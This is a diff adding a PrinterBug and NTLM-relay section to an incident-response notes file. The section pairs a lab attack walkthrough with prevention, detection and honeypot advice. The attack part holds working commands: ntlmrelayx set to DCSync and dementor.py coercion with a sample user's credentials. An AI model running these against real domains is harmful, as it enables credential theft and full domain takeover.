@@ -3276,6 +3276,129 @@ If an Active Directory forest has been compromised, we need to reset all users' 
 
 
 
+## Print Spooler & NTLM Relaying 
+
+### Descriptions
+
+The Print Spooler is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, Lee Christensen found the PrinterBug. The functions RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a TGT. Therefore, any domain user can coerce RemoteServer$ to authenticate to any machine. Microsoft's stance on the PrinterBug was that it will not be fixed, as the issue is "by-design".
+
+The impact of PrinterBug is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:
+
+- Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
+- Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
+- Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
+- Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
+
+### Attack 
+In this attack path, we will relay the connection to another DC and perform DCSync (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.
+
+To begin, we will configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack:
+
+
+```
+$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+```
+
+![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/693fd4e3-4b7a-45d6-8e10-44bab3ee79eb)
+
+Next, we need to trigger the PrinterBug using the Kali box with NTLMRelayx listening. To trigger the connection back, we'll use Dementor (when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously compromised Bob):
+
+Link to Dementor : https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py
+
+```
+python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
+
+[*] connecting to 172.16.18.3
+[*] bound to spoolss
+[*] getting context handle...
+[*] sending RFFPCNEX...
+[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
+[*] done!
+```
+
+![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/bbd238d4-26e7-4c9b-819e-10fcab7e1c62)
+
+Now, switching back to the terminal session with NTLMRelayx, we will see that DCSync was successful:
+
+![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/107550f0-caff-4ab1-b527-12afea82709d)
+
+
+### Prevention
+
+Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.
+
+Additionally, there is an option to prevent the abuse of the PrinterBug while keeping the service running: when disabling the registry key RegisterSpoolerRemoteRpcEndPoint, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it:
+
+![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6b143c7c-e6af-4da0-969a-847a8ca92122)
+
+
+### Detection
+
+Exploiting the PrinterBug will leave traces of network connections toward the Domain Controller; however, they are too generic to be used as a detection mechanism.
+
+In the case of using NTLMRelayx to perform DCSync, no event ID 4662 is generated (as mentioned in the DCSync section); however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1. This event originates from the IP address of the Kali machine, not the Domain Controller, as we can see below:
+
+![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/cc3a1e1a-3b29-4fe6-91ce-88a76af77982)
+
+
+A suitable detection mechanism always correlates all logon attempts from core infrastructure servers to their respective IP addresses (which should be static and known).
+
+
+### Honeypot
+It is possible to use the PrinterBug as means of alerting on suspicious behavior in the environment. In this scenario, we would block outbound connections from our servers to ports 139 and 445; software or physical firewalls can achieve this. Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent. However, those blocked connections will act as signs of compromise for the blue team. Before enforcing anything related to this exploit, we should ensure that we have sufficient logs and knowledge of our environment to ensure that legitimate connections are allowed (for example, we must keep the mentioned ports open between DCs, so that they can replicate data).
+
+While this may seem suitable for a honeypot to trick adversaries, we should be careful before implementing it, as currently, the bug requires the machine to connect back to us, but if a new unknown bug is discovered, which allows for some type of Remote Code Execution without the reverse connection, then this will backfire on us. Therefore, we should only consider this option if we are an extremely mature organization and can promptly act on alerts and disable the service on all devices should a new bug be discovered.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
